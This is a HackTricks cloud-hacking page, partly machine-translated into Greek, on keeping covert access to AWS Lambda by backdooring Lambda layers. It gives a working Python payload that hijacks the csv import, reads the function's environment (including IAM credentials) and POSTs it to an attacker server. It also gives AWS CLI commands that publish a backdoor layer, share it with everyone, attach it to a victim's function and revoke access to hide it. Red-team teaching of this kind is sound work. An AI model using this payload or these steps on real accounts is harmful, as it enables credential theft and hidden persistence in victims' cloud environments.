# AWS - Lambda Layers Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Lambda Layers

Ένα Lambda layer είναι ένα αρχείο .zip που **μπορεί να περιέχει επιπλέον κώδικα** ή άλλο περιεχόμενο. Ένα layer μπορεί να περιέχει βιβλιοθήκες, μια [προσαρμοσμένη εκτέλεση](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), δεδομένα ή αρχεία ρυθμίσεων.

Είναι δυνατόν να συμπεριλάβετε έως **πέντε layers ανά λειτουργία**. Όταν συμπεριλαμβάνετε ένα layer σε μια λειτουργία, το **περιεχόμενο εξάγεται στον φάκελο `/opt`** στο περιβάλλον εκτέλεσης.

Κατά **προεπιλογή**, τα **layers** που δημιουργείτε είναι **ιδιωτικά** για τον λογαριασμό σας AWS. Μπορείτε να επιλέξετε να **μοιραστείτε** ένα layer με άλλους λογαριασμούς ή να **κάνετε** το layer **δημόσιο**. Εάν οι λειτουργίες σας καταναλώνουν ένα layer που δημοσίευσε διαφορετικός λογαριασμός, οι λειτουργίες σας μπορούν να **συνεχίσουν να χρησιμοποιούν την έκδοση του layer μετά την διαγραφή του, ή μετά την ανάκληση της άδειάς σας για πρόσβαση στο layer**. Ωστόσο, δεν μπορείτε να δημιουργήσετε μια νέα λειτουργία ή να ενημερώσετε λειτουργίες χρησιμοποιώντας μια διαγραμμένη έκδοση layer.

Οι λειτουργίες που αναπτύσσονται ως εικόνα κοντέινερ δεν χρησιμοποιούν layers. Αντίθετα, συσκευάζετε την προτιμώμενη εκτέλεση, τις βιβλιοθήκες και άλλες εξαρτήσεις στην εικόνα κοντέινερ όταν κατασκευάζετε την εικόνα.

### Python load path

Η διαδρομή φόρτωσης που θα χρησιμοποιήσει η Python στο lambda είναι η εξής:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
Έλεγχος του πώς οι **δεύτερες** και τρίτες **θέσεις** καταλαμβάνονται από καταλόγους όπου οι **lambda layers** αποσυμπιέζουν τα αρχεία τους: **`/opt/python/lib/python3.9/site-packages`** και **`/opt/python`**

{% hint style="danger" %}
Εάν ένας επιτιθέμενος καταφέρει να **backdoor** μια χρησιμοποιούμενη **lambda layer** ή **προσθέσει μία** που θα **εκτελεί αυθαίρετο κώδικα όταν φορτώνεται μια κοινή βιβλιοθήκη**, θα είναι σε θέση να εκτελεί κακόβουλο κώδικα με κάθε κλήση lambda.
{% endhint %}

Επομένως, οι απαιτήσεις είναι:

* **Έλεγχος βιβλιοθηκών** που είναι **φορτωμένες** από τον κώδικα των θυμάτων
* Δημιουργία μιας **proxy βιβλιοθήκης με lambda layers** που θα **εκτελεί προσαρμοσμένο κώδικα** και θα **φορτώνει την αρχική** βιβλιοθήκη.

### Προφορτωμένες βιβλιοθήκες

{% hint style="warning" %}
Όταν εκμεταλλεύτηκα αυτή την τεχνική, βρήκα μια δυσκολία: Ορισμένες βιβλιοθήκες είναι **ήδη φορτωμένες** στο runtime της python όταν εκτελείται ο κώδικάς σας. Περίμενα να βρω πράγματα όπως `os` ή `sys`, αλλά **ακόμα και η βιβλιοθήκη `json` ήταν φορτωμένη**.\
Για να εκμεταλλευτεί αυτή την τεχνική επιμονής, ο κώδικας πρέπει να **φορτώσει μια νέα βιβλιοθήκη που δεν είναι φορτωμένη** όταν εκτελείται ο κώδικας.
{% endhint %}

Με έναν κώδικα python όπως αυτόν είναι δυνατόν να αποκτηθεί η **λίστα των βιβλιοθηκών που είναι προφορτωμένες** μέσα στο runtime της python σε lambda:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
Και αυτή είναι η **λίστα** (ελέγξτε ότι οι βιβλιοθήκες όπως το `os` ή το `json` είναι ήδη εκεί)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
Και αυτή είναι η λίστα με τις **βιβλιοθήκες** που **περιλαμβάνει η lambda εγκατεστημένες από προεπιλογή**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### Backdooring Lambda Layer

Σε αυτό το παράδειγμα ας υποθέσουμε ότι ο στοχευμένος κώδικας εισάγει **`csv`**. Θα **backdoor-άρουμε την εισαγωγή της βιβλιοθήκης `csv`**.

Για να το κάνουμε αυτό, θα **δημιουργήσουμε τον φάκελο csv** με το αρχείο **`__init__.py`** μέσα σε μια διαδρομή που φορτώνεται από τη lambda: **`/opt/python/lib/python3.9/site-packages`**\
Έτσι, όταν η lambda εκτελείται και προσπαθεί να φορτώσει **csv**, το **αρχείο `__init__.py` μας θα φορτωθεί και θα εκτελεστεί**.\
Αυτό το αρχείο πρέπει να:

* Εκτελεί το payload μας
* Φορτώνει την αρχική βιβλιοθήκη csv

Μπορούμε να κάνουμε και τα δύο με:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
Then, create a zip with this code in the path **`python/lib/python3.9/site-packages/__init__.py`** and add it as a lambda layer.

You can find this code in [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor)

The integrated payload will **στείλει τα IAM creds σε έναν διακομιστή ΤΗΝ ΠΡΩΤΗ ΦΟΡΑ που θα κληθεί ή ΜΕΤΑ από μια επαναφορά του κοντέινερ lambda** (αλλαγή κώδικα ή κρύα lambda), αλλά **άλλες τεχνικές** όπως οι παρακάτω θα μπορούσαν επίσης να ενσωματωθούν:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### External Layers

Note that it's possible to use **lambda layers from external accounts**. Moreover, a lambda can use a layer from an external account even if it doesn't have permissions.\
Also note that the **max number of layers a lambda can have is 5**.

Therefore, in order to improve the versatility of this technique an attacker could:

* Backdoor an existing layer of the user (nothing is external)
* **Δημιουργήσει** μια **layer** στον **λογαριασμό του**, δώσει στον **λογαριασμό του θύματος πρόσβαση** για να χρησιμοποιήσει τη layer, **ρυθμίσει** τη **layer** στο Lambda του θύματος και **αφαιρέσει την άδεια**.
* The **Lambda** will still be able to **χρησιμοποιεί τη layer** και το **θύμα δεν θα** έχει καμία εύκολη δυνατότητα να **κατεβάσει τον κώδικα των layers** (εκτός από το να αποκτήσει ένα rev shell μέσα στο lambda)
* The victim **δεν θα δει εξωτερικές layers** που χρησιμοποιούνται με **`aws lambda list-layers`**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
